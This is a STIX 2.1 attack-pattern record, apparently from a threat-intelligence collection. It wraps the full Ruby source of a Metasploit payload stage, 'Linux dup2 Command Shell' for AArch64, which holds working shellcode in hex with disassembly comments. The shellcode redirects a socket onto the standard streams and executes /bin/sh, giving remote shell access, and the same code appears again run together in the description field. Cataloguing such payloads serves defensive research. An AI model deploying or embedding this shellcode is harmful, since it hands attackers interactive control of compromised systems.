{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0f66b6d3-42df-4051-b43a-ed6b7f31e4b3",
    "created": "2024-08-14T16:33:19.269701Z",
    "modified": "2024-08-14T16:33:19.269705Z",
    "name": "Linux dup2 Command Shell",
    "description": "dup2 socket in x12, then execve 'License'       => MSF_LICENSE 'Platform'      => 'linux' 'Arch'          => ARCH_AARCH64 'Session'       => Msf::Sessions::CommandShell 'Stage'         => { 'Payload' => [ # Generated from external/source/shellcode/linux/aarch64/stage_shell.s 0xaa0c03e0,          #  mov\tx0, x12 0xd2800002,          #  mov\tx2, #0x0                   \t// #0 0xd2800001,          #  mov\tx1, #0x0                   \t// #0 0xd2800308,          #  mov\tx8, #0x18                  \t// #24 0xd4000001,          #  svc\t#0x0 0xd2800021,          #  mov\tx1, #0x1                   \t// #1 0xd2800308,          #  mov\tx8, #0x18                  \t// #24 0xd4000001,          #  svc\t#0x0 0xd2800041,          #  mov\tx1, #0x2                   \t// #2 0xd2800308,          #  mov\tx8, #0x18                  \t// #24 0xd4000001,          #  svc\t#0x0 0x10000140,          #  adr\tx0, 54 <shell> 0xd2800002,          #  mov\tx2, #0x0                   \t// #0 0xf90003e0,          #  str\tx0, [sp] 0xf90007e2,          #  str\tx2, [sp,#8] 0x910003e1,          #  mov\tx1, sp 0xd2801ba8,          #  mov\tx8, #0xdd                  \t// #221 0xd4000001,          #  svc\t#0x0 0xd2800000,          #  mov\tx0, #0x0                   \t// #0 0xd2800ba8,          #  mov\tx8, #0x5d                  \t// #93 0xd4000001,          #  svc\t#0x0 0x00000000,          #  .word\t0x00000000                // shell 0x00000000,          #  .word\t0x00000000 0x00000000,          #  .word\t0x00000000 0x00000000,          #  .word\t0x00000000 ].pack(\"V*\")  )) register_options([ OptString.new('SHELL', [ true, \"The shell to execute.\", \"/bin/sh\" ]) ]) end  def generate_stage(opts = {}) p = super sh = datastore['SHELL'] if sh.length >= 16 raise ArgumentError, \"The specified shell must be less than 16 bytes.\" end p[84, sh.length] = sh p end  end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/linux/aarch64/shell.rb",
            "external_id": "shell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux dup2 Command Shell',\n      'Description'   => 'dup2 socket in x12, then execve',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_AARCH64,\n      'Session'       => Msf::Sessions::CommandShell,\n      'Stage'         =>\n        {\n          'Payload' =>\n          [\n            # Generated from external/source/shellcode/linux/aarch64/stage_shell.s\n            0xaa0c03e0,          #  mov\tx0, x12\n            0xd2800002,          #  mov\tx2, #0x0                   \t// #0\n            0xd2800001,          #  mov\tx1, #0x0                   \t// #0\n            0xd2800308,          #  mov\tx8, #0x18                  \t// #24\n            0xd4000001,          #  svc\t#0x0\n            0xd2800021,          #  mov\tx1, #0x1                   \t// #1\n            0xd2800308,          #  mov\tx8, #0x18                  \t// #24\n            0xd4000001,          #  svc\t#0x0\n            0xd2800041,          #  mov\tx1, #0x2                   \t// #2\n            0xd2800308,          #  mov\tx8, #0x18                  \t// #24\n            0xd4000001,          #  svc\t#0x0\n            0x10000140,          #  adr\tx0, 54 <shell>\n            0xd2800002,          #  mov\tx2, #0x0                   \t// #0\n            0xf90003e0,          #  str\tx0, [sp]\n            0xf90007e2,          #  str\tx2, [sp,#8]\n            0x910003e1,          #  mov\tx1, sp\n            0xd2801ba8,          #  mov\tx8, #0xdd                  \t// #221\n            0xd4000001,          #  svc\t#0x0\n            0xd2800000,          #  mov\tx0, #0x0                   \t// #0\n            0xd2800ba8,          #  mov\tx8, #0x5d                  \t// #93\n            0xd4000001,          #  svc\t#0x0\n            0x00000000,          #  .word\t0x00000000                // shell\n            0x00000000,          #  .word\t0x00000000\n            0x00000000,          #  .word\t0x00000000\n            0x00000000,          #  .word\t0x00000000\n          ].pack(\"V*\")\n        }\n      ))\n    register_options([\n      OptString.new('SHELL', [ true, \"The shell to execute.\", \"/bin/sh\" ]),\n    ])\n  end\n\n  def generate_stage(opts = {})\n    p = super\n    sh = datastore['SHELL']\n    if sh.length >= 16\n      raise ArgumentError, \"The specified shell must be less than 16 bytes.\"\n    end\n    p[84, sh.length] = sh\n    p\n  end\n\nend\n"
}